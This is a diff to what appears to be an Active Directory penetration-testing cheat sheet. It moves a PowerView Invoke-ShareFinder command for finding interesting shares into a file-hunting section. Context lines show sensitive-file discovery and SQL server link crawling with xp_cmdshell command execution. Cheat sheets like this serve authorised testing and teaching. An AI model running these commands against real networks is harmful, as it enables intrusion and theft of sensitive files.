@@ -52,6 +52,11 @@ Invoke-FileFinder –Verbose (Find sensitive files on computers in the domain)
 
 Get-NetFileServer (Get all fileservers of the domain)
 
+find interesting share:
+```
+Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose -Domain "<targetDOMAIN>"
+```
+
 # OU
 
 Get-NetOU -FullData (Get OUs in a domain)
@@ -142,11 +147,6 @@ Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Verbose (Enum server sql to 
 #### If xp_cmdshell is enabled (or RPC out is true), command execution is possible via this command:
 ```
 Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Query "exec master..xp_cmdshell 'whoami'"
-```
-
-# ENUM SHARE
-```
-Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
 ```
 
 # Priv Esc
